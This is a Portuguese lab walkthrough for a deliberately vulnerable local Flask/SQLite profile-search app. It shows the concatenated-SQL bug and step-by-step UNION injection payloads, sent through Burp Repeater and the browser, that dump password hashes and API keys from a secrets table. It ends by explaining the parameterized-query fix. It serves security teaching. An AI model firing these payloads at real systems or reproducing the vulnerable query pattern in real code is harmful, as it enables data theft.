# Walkthrough — sqli-union-basic

## 1. Contexto

A app expõe uma página de "busca de perfil de usuário". Você digita um username em `/`, o form dispara um request `GET /profile?username=<nome>`, e o servidor faz um query numa tabela `users` no SQLite e renderiza a linha correspondente numa tabelinha HTML. Três usuários de teste estão no seed: `alice`, `bob`, `carol`.

Junto com `users`, o mesmo arquivo de banco tem uma tabela `secrets` com password hashes e API keys. A feature nunca lê dela — mas a connection do banco tem acesso às duas.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/profile` monta o SQL assim:

```python
username = request.args.get("username", "")
# VULNERABLE: user input concatenated into SQL string
query = f"SELECT username, bio, joined_at FROM users WHERE username = '{username}'"
rows = conn.execute(query).fetchall()
```

O valor de `username` vem direto da query string e é colado no texto SQL via f-string. Sem escape, sem parameter binding. Tudo que o cliente mandar depois de `WHERE username = '` vira parte da SQL que chega no SQLite. O template `profile.html` da versão vulnerable também renderiza a query executada de volta na página num bloco de debug, o que facilita seguir este lab — num alvo real, você inferiria o mesmo comportamento a partir de mensagem de erro, timing, ou inferência blind.

## 3. Exploração via Burp Suite (trilha principal)

Configure o Burp Proxy e aponte o browser pra ele. Visite <http://127.0.0.1:8001/>, submeta `alice` pelo form uma vez pra capturar o tráfego, depois clique com o botão direito no request `GET /profile?username=alice` em **Proxy → HTTP history** e escolha **Send to Repeater**.

### Uma nota sobre URL encoding

Uma pegadinha que pega todo mundo uma vez: **request lines de HTTP não aceitam espaços literais.**

O formato da request line é `METHOD SP URI SP VERSION` — espaços únicos delimitam as três partes. Se você colocar um espaço literal dentro da URI, o server enxerga quatro tokens em vez de três e rejeita o request com **400 Bad Request** antes da sua SQL sequer rodar:

```
GET /profile?username=alice' -- HTTP/1.1
 ^                          ^   ^
 |                          |   └─ o que o server acha que é a versão HTTP
 |                          └───── o que o server acha que é a URI (cortada no primeiro espaço)
 └──────────────────────────────── método
```

Então todo espaço dentro da URI tem que ser URL-encoded como `%20`. Esse é o único caractere que o parser do HTTP *obriga* você a encodar. Os outros caracteres do seu payload — `'`, `,`, `=`, `--` — são perfeitamente legais dentro de uma query string pela RFC 3986 e passam sem encoding.

**Duas formas de fazer isso no Burp Repeater:**

1. **Encoding mínimo (o que os passos abaixo usam).** Digite o payload com `%20` em todo espaço, resto literal. Legível e válido.
2. **Ctrl+U sobre a seleção.** Cole o payload decoded, selecione ele, aperte **Ctrl+U**. O Burp encoda todo caractere unsafe agressivamente — espaços viram `%20`, aspas viram `%27`, vírgulas viram `%2C` e assim por diante. Funciona também, só fica mais difícil de ler.

As duas formas mandam os mesmos bytes no fio pro server depois que o Burp termina o encoding, e o server URL-decoda tudo antes da sua app Flask ver — então `alice'%20--` e `alice%27%20--` chegam na app como a mesma string `alice' --`. Use a que achar mais fácil de editar.

Cada passo abaixo mostra dois blocos: um **Payload** (totalmente decoded, pra leitura) e uma **Request line** (com espaços como `%20`, pronta pra colar direto no Repeater).

### Passo 1 — Confirmar o injection point

Payload:

```
alice' --
```

Request line no Repeater:

```
GET /profile?username=alice'%20-- HTTP/1.1
Host: 127.0.0.1:8001
```

Response: a tabela continua mostrando a linha da Alice. O bloco "Executed query" confirma a injection:

```
SELECT username, bio, joined_at FROM users WHERE username = 'alice' --'
```

Sua `'` fechou a string literal, e o `--` comentou a `'` final que a app tentou concatenar. O statement foi parseado sem erro e retornou Alice. É a prova de que seu input virou código SQL — não só dado.

### Passo 2 — Determinar contagem de colunas e quais são renderizadas

Payload:

```
x' UNION SELECT '1','2','3' --
```

Request line no Repeater:

```
GET /profile?username=x'%20UNION%20SELECT%20'1','2','3'%20-- HTTP/1.1
Host: 127.0.0.1:8001
```

Response: a tabela agora mostra uma linha com `1 | 2 | 3`. O primeiro SELECT retornou zero linhas (nenhum usuário chamado `x`); o UNION anexou os três literais. Você agora sabe que o result set tem **três colunas** e todas as três são renderizadas.

Probe negativa (opcional): mude o UNION pra duas colunas (`UNION SELECT '1','2'`). O SQLite vai rejeitar o statement porque UNION exige mesmo número de colunas — confirmando que sua injection está de fato chegando na engine e não está sendo removida em lugar nenhum.

### Passo 3 — Exfiltrar dados de outra tabela

Payload:

```
x' UNION SELECT users.username, secrets.password_hash, secrets.api_key FROM users JOIN secrets ON users.id = secrets.user_id --
```

Request line no Repeater:

```
GET /profile?username=x'%20UNION%20SELECT%20users.username,%20secrets.password_hash,%20secrets.api_key%20FROM%20users%20JOIN%20secrets%20ON%20users.id%20=%20secrets.user_id%20-- HTTP/1.1
Host: 127.0.0.1:8001
```

Response: três linhas, uma por usuário, cada uma vazando username, hash estilo bcrypt e API key. É aqui que o bug mostra seu tamanho — a feature tinha escopo de três campos públicos de um único usuário, mas a connection do banco não. Qualquer tabela alcançável por essa connection agora é legível através do endpoint `/profile`.

## 4. Exploração via browser (trilha secundária, opcional)

Os mesmos três payloads colados direto na barra de endereços do browser (ou no input do form em `/`):

1. `http://127.0.0.1:8001/profile?username=alice' --`
2. `http://127.0.0.1:8001/profile?username=x' UNION SELECT '1','2','3' --`
3. `http://127.0.0.1:8001/profile?username=x' UNION SELECT users.username, secrets.password_hash, secrets.api_key FROM users JOIN secrets ON users.id = secrets.user_id --`

O browser URL-encoda os espaços (e às vezes as aspas) pra você antes de enviar, então as formas cruas acima colam limpas. O bloco "Executed query" em cada página de response deixa o caminho source → sink explícito sem precisar de Burp. Use esta trilha pra a primeira leitura; passe pro Burp em tudo depois.

## 5. Por que o fix funciona

Veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra a mudança. Em resumo: a versão fixed chama `conn.execute("... WHERE username = ?", (username,))`. O driver do SQLite faz o parse do statement primeiro, *sem* o valor do parâmetro, e só depois liga `username` como valor literal. Nenhum caractere do input — `'`, `--`, `UNION`, `;`, newline — consegue escapar do slot de string literal pra virar sintaxe SQL. Rode qualquer payload da seção 3 contra <http://127.0.0.1:8101/profile> pra confirmar: a tabela volta vazia (nenhum usuário literalmente chamado `x' UNION SELECT ...` existe), nenhum secret vaza.
